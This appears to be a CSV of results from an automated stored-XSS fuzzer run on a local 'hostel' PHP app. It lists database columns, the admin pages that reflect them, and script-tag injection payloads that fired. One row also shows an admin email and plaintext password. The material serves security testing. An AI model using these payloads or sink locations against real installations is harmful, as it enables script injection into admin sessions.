web app,DB source,reflection sink,id,payload,description
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",905586,"""'><script>xss(905586)</script>","
            hostel.states.State[3][1]
            original row: [4, 'Assam']
            fuzzed row: [4, '""\'><script>xss(905586)</script>']
            change: 'Assam' => '""'><script>xss(905586)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",906241,"""'><script>xss(906241)</script>","
            hostel.states.State[17][1]
            original row: [18, 'Kerala']
            fuzzed row: [18, '""\'><script>xss(906241)</script>']
            change: 'Kerala' => '""'><script>xss(906241)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",909288,"""'><script>xss(909288)</script>","
            hostel.states.State[21][1]
            original row: [22, 'Manipur']
            fuzzed row: [22, '""\'><script>xss(909288)</script>']
            change: 'Manipur' => '""'><script>xss(909288)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",913016,"""'><script>xss(913016)</script>","
            hostel.states.State[7][1]
            original row: [8, 'Dadra and Nagar Haveli (UT)']
            fuzzed row: [8, '""\'><script>xss(913016)</script>']
            change: 'Dadra and Nagar Haveli (UT)' => '""'><script>xss(913016)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",914735,"""'><script>xss(914735)</script>","
            hostel.states.State[24][1]
            original row: [25, 'Nagaland']
            fuzzed row: [25, '""\'><script>xss(914735)</script>']
            change: 'Nagaland' => '""'><script>xss(914735)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,userlog.userEmail,"http://localhost/hostel/admin/access-log.php
http://localhost/hostel/admin/access-log.php#",917592,"""'><script>xss(917592)</script>","
            hostel.userlog.userEmail[0][2]
            original row: [6, 3, '10806121', bytearray(b'::1'), '', '', datetime.datetime(2020, 7, 20, 14, 56, 45)]
            fuzzed row: [6, 3, '""\'><script>xss(917592)</script>', bytearray(b'::1'), '', '', datetime.datetime(2020, 7, 20, 14, 56, 45)]
            change: '10806121' => '""'><script>xss(917592)</script>'
            
fuzzed after scan 22 / 33
found as XSS in scan 23 / 33"
hostel,userlog.country,"http://localhost/hostel/admin/access-log.php
http://localhost/hostel/admin/access-log.php#",928645,"""'><script>xss(928645)</script>","
            hostel.userlog.country[1][5]
            original row: [7, 3, 'test@gmail.com', bytearray(b'192.168.96.1'), '', '', datetime.datetime(2023, 3, 13, 9, 18, 37)]
            fuzzed row: [7, 3, 'test@gmail.com', bytearray(b'192.168.96.1'), '', '""\'><script>xss(928645)</script>', datetime.datetime(2023, 3, 13, 9, 18, 37)]
            change: '' => '""'><script>xss(928645)</script>'
            
fuzzed after scan 24 / 33
found as XSS in scan 25 / 33"
hostel,admin.username,"http://localhost/hostel/admin/admin-profile.php
http://localhost/hostel/admin/admin-profile.php#",929995,"""'><script>xss(929995)</script>","
            hostel.admin.username[0][1]
            original row: [1, 'admin', 'anuj.lpu1@gmail.com', 'Test@1234', datetime.datetime(2016, 4, 4, 20, 31, 45), datetime.date(2016, 4, 17)]
            fuzzed row: [1, '""\'><script>xss(929995)</script>', 'anuj.lpu1@gmail.com', 'Test@1234', datetime.datetime(2016, 4, 4, 20, 31, 45), datetime.date(2016, 4, 17)]
            change: 'admin' => '""'><script>xss(929995)</script>'
            
fuzzed after scan 0 / 33
found as XSS in scan 1 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",932821,"""'><script>xss(932821)</script>","
            hostel.states.State[13][1]
            original row: [14, 'Himachal Pradesh']
            fuzzed row: [14, '""\'><script>xss(932821)</script>']
            change: 'Himachal Pradesh' => '""'><script>xss(932821)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",933277,"""'><script>xss(933277)</script>","
            hostel.states.State[16][1]
            original row: [17, 'Karnataka']
            fuzzed row: [17, '""\'><script>xss(933277)</script>']
            change: 'Karnataka' => '""'><script>xss(933277)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",933754,"""'><script>xss(933754)</script>","
            hostel.states.State[23][1]
            original row: [24, 'Mizoram']
            fuzzed row: [24, '""\'><script>xss(933754)</script>']
            change: 'Mizoram' => '""'><script>xss(933754)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",942234,"""'><script>xss(942234)</script>","
            hostel.states.State[15][1]
            original row: [16, 'Jharkhand']
            fuzzed row: [16, '""\'><script>xss(942234)</script>']
            change: 'Jharkhand' => '""'><script>xss(942234)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",944493,"""'><script>xss(944493)</script>","
            hostel.states.State[33][1]
            original row: [34, 'Uttarakhand']
            fuzzed row: [34, '""\'><script>xss(944493)</script>']
            change: 'Uttarakhand' => '""'><script>xss(944493)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,userlog.city,"http://localhost/hostel/admin/access-log.php
http://localhost/hostel/admin/access-log.php#",944731,"""'><script>xss(944731)</script>","
            hostel.userlog.city[1][4]
            original row: [7, 3, 'test@gmail.com', bytearray(b'192.168.96.1'), '', '', datetime.datetime(2023, 3, 13, 9, 18, 37)]
            fuzzed row: [7, 3, 'test@gmail.com', bytearray(b'192.168.96.1'), '""\'><script>xss(944731)</script>', '', datetime.datetime(2023, 3, 13, 9, 18, 37)]
            change: '' => '""'><script>xss(944731)</script>'
            
fuzzed after scan 23 / 33
found as XSS in scan 24 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",945252,"""'><script>xss(945252)</script>","
            hostel.states.State[30][1]
            original row: [31, 'Tamil Nadu']
            fuzzed row: [31, '""\'><script>xss(945252)</script>']
            change: 'Tamil Nadu' => '""'><script>xss(945252)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",947084,"""'><script>xss(947084)</script>","
            hostel.states.State[1][1]
            original row: [2, 'Andhra Pradesh']
            fuzzed row: [2, '""\'><script>xss(947084)</script>']
            change: 'Andhra Pradesh' => '""'><script>xss(947084)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,userlog.city,"http://localhost/hostel/admin/access-log.php
http://localhost/hostel/admin/access-log.php#",947983,"""'><script>xss(947983)</script>","
            hostel.userlog.city[0][4]
            original row: [6, 3, '10806121', bytearray(b'::1'), '', '', datetime.datetime(2020, 7, 20, 14, 56, 45)]
            fuzzed row: [6, 3, '10806121', bytearray(b'::1'), '""\'><script>xss(947983)</script>', '', datetime.datetime(2020, 7, 20, 14, 56, 45)]
            change: '' => '""'><script>xss(947983)</script>'
            
fuzzed after scan 23 / 33
found as XSS in scan 24 / 33"
hostel,userlog.userEmail,"http://localhost/hostel/admin/access-log.php
http://localhost/hostel/admin/access-log.php#",951417,"""'><script>xss(951417)</script>","
            hostel.userlog.userEmail[1][2]
            original row: [7, 3, 'test@gmail.com', bytearray(b'192.168.96.1'), '', '', datetime.datetime(2023, 3, 13, 9, 18, 37)]
            fuzzed row: [7, 3, '""\'><script>xss(951417)</script>', bytearray(b'192.168.96.1'), '', '', datetime.datetime(2023, 3, 13, 9, 18, 37)]
            change: 'test@gmail.com' => '""'><script>xss(951417)</script>'
            
fuzzed after scan 22 / 33
found as XSS in scan 23 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",953460,"""'><script>xss(953460)</script>","
            hostel.states.State[32][1]
            original row: [33, 'Tripura']
            fuzzed row: [33, '""\'><script>xss(953460)</script>']
            change: 'Tripura' => '""'><script>xss(953460)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",956339,"""'><script>xss(956339)</script>","
            hostel.states.State[9][1]
            original row: [10, 'Delhi (NCT)']
            fuzzed row: [10, '""\'><script>xss(956339)</script>']
            change: 'Delhi (NCT)' => '""'><script>xss(956339)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",958107,"""'><script>xss(958107)</script>","
            hostel.states.State[22][1]
            original row: [23, 'Meghalaya']
            fuzzed row: [23, '""\'><script>xss(958107)</script>']
            change: 'Meghalaya' => '""'><script>xss(958107)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",958389,"""'><script>xss(958389)</script>","
            hostel.states.State[6][1]
            original row: [7, 'Chhattisgarh']
            fuzzed row: [7, '""\'><script>xss(958389)</script>']
            change: 'Chhattisgarh' => '""'><script>xss(958389)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",959624,"""'><script>xss(959624)</script>","
            hostel.states.State[27][1]
            original row: [28, 'Punjab']
            fuzzed row: [28, '""\'><script>xss(959624)</script>']
            change: 'Punjab' => '""'><script>xss(959624)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",961077,"""'><script>xss(961077)</script>","
            hostel.states.State[25][1]
            original row: [26, 'Odisha']
            fuzzed row: [26, '""\'><script>xss(961077)</script>']
            change: 'Odisha' => '""'><script>xss(961077)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",965034,"""'><script>xss(965034)</script>","
            hostel.states.State[5][1]
            original row: [6, 'Chandigarh (UT)']
            fuzzed row: [6, '""\'><script>xss(965034)</script>']
            change: 'Chandigarh (UT)' => '""'><script>xss(965034)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",966904,"""'><script>xss(966904)</script>","
            hostel.states.State[12][1]
            original row: [13, 'Haryana']
            fuzzed row: [13, '""\'><script>xss(966904)</script>']
            change: 'Haryana' => '""'><script>xss(966904)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",971972,"""'><script>xss(971972)</script>","
            hostel.states.State[2][1]
            original row: [3, 'Arunachal Pradesh']
            fuzzed row: [3, '""\'><script>xss(971972)</script>']
            change: 'Arunachal Pradesh' => '""'><script>xss(971972)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",975286,"""'><script>xss(975286)</script>","
            hostel.states.State[10][1]
            original row: [11, 'Goa']
            fuzzed row: [11, '""\'><script>xss(975286)</script>']
            change: 'Goa' => '""'><script>xss(975286)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",976101,"""'><script>xss(976101)</script>","
            hostel.states.State[34][1]
            original row: [35, 'Uttar Pradesh']
            fuzzed row: [35, '""\'><script>xss(976101)</script>']
            change: 'Uttar Pradesh' => '""'><script>xss(976101)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",977258,"""'><script>xss(977258)</script>","
            hostel.states.State[19][1]
            original row: [20, 'Madhya Pradesh']
            fuzzed row: [20, '""\'><script>xss(977258)</script>']
            change: 'Madhya Pradesh' => '""'><script>xss(977258)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",977932,"""'><script>xss(977932)</script>","
            hostel.states.State[20][1]
            original row: [21, 'Maharashtra']
            fuzzed row: [21, '""\'><script>xss(977932)</script>']
            change: 'Maharashtra' => '""'><script>xss(977932)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",978453,"""'><script>xss(978453)</script>","
            hostel.states.State[4][1]
            original row: [5, 'Bihar']
            fuzzed row: [5, '""\'><script>xss(978453)</script>']
            change: 'Bihar' => '""'><script>xss(978453)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",978636,"""'><script>xss(978636)</script>","
            hostel.states.State[0][1]
            original row: [1, 'Andaman and Nicobar Island (UT)']
            fuzzed row: [1, '""\'><script>xss(978636)</script>']
            change: 'Andaman and Nicobar Island (UT)' => '""'><script>xss(978636)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",978923,"""'><script>xss(978923)</script>","
            hostel.states.State[26][1]
            original row: [27, 'Puducherry (UT)']
            fuzzed row: [27, '""\'><script>xss(978923)</script>']
            change: 'Puducherry (UT)' => '""'><script>xss(978923)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",979974,"""'><script>xss(979974)</script>","
            hostel.states.State[11][1]
            original row: [12, 'Gujarat']
            fuzzed row: [12, '""\'><script>xss(979974)</script>']
            change: 'Gujarat' => '""'><script>xss(979974)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",983671,"""'><script>xss(983671)</script>","
            hostel.states.State[35][1]
            original row: [36, 'West Bengal']
            fuzzed row: [36, '""\'><script>xss(983671)</script>']
            change: 'West Bengal' => '""'><script>xss(983671)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,admin.email,"http://localhost/hostel/admin/admin-profile.php
http://localhost/hostel/admin/admin-profile.php#",984443,"""'><script>xss(984443)</script>","
            hostel.admin.email[0][2]
            original row: [1, 'admin', 'anuj.lpu1@gmail.com', 'Test@1234', datetime.datetime(2016, 4, 4, 20, 31, 45), datetime.date(2016, 4, 17)]
            fuzzed row: [1, 'admin', '""\'><script>xss(984443)</script>', 'Test@1234', datetime.datetime(2016, 4, 4, 20, 31, 45), datetime.date(2016, 4, 17)]
            change: 'anuj.lpu1@gmail.com' => '""'><script>xss(984443)</script>'
            
fuzzed after scan 1 / 33
found as XSS in scan 2 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",985968,"""'><script>xss(985968)</script>","
            hostel.states.State[18][1]
            original row: [19, 'Lakshadweep (UT)']
            fuzzed row: [19, '""\'><script>xss(985968)</script>']
            change: 'Lakshadweep (UT)' => '""'><script>xss(985968)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",989788,"""'><script>xss(989788)</script>","
            hostel.states.State[14][1]
            original row: [15, 'Jammu and Kashmir']
            fuzzed row: [15, '""\'><script>xss(989788)</script>']
            change: 'Jammu and Kashmir' => '""'><script>xss(989788)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",990649,"""'><script>xss(990649)</script>","
            hostel.states.State[31][1]
            original row: [32, 'Telangana']
            fuzzed row: [32, '""\'><script>xss(990649)</script>']
            change: 'Telangana' => '""'><script>xss(990649)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",992468,"""'><script>xss(992468)</script>","
            hostel.states.State[28][1]
            original row: [29, 'Rajastha']
            fuzzed row: [29, '""\'><script>xss(992468)</script>']
            change: 'Rajastha' => '""'><script>xss(992468)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",994855,"""'><script>xss(994855)</script>","
            hostel.states.State[29][1]
            original row: [30, 'Sikkim']
            fuzzed row: [30, '""\'><script>xss(994855)</script>']
            change: 'Sikkim' => '""'><script>xss(994855)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,states.State,"http://localhost/hostel/admin/registration.php
http://localhost/hostel/admin/registration.php#",995017,"""'><script>xss(995017)</script>","
            hostel.states.State[8][1]
            original row: [9, 'Daman and Diu (UT)']
            fuzzed row: [9, '""\'><script>xss(995017)</script>']
            change: 'Daman and Diu (UT)' => '""'><script>xss(995017)</script>'
            
fuzzed after scan 21 / 33
found as XSS in scan 22 / 33"
hostel,userlog.country,"http://localhost/hostel/admin/access-log.php
http://localhost/hostel/admin/access-log.php#",995082,"""'><script>xss(995082)</script>","
            hostel.userlog.country[0][5]
            original row: [6, 3, '10806121', bytearray(b'::1'), '', '', datetime.datetime(2020, 7, 20, 14, 56, 45)]
            fuzzed row: [6, 3, '10806121', bytearray(b'::1'), '', '""\'><script>xss(995082)</script>', datetime.datetime(2020, 7, 20, 14, 56, 45)]
            change: '' => '""'><script>xss(995082)</script>'
            
fuzzed after scan 24 / 33
found as XSS in scan 25 / 33"
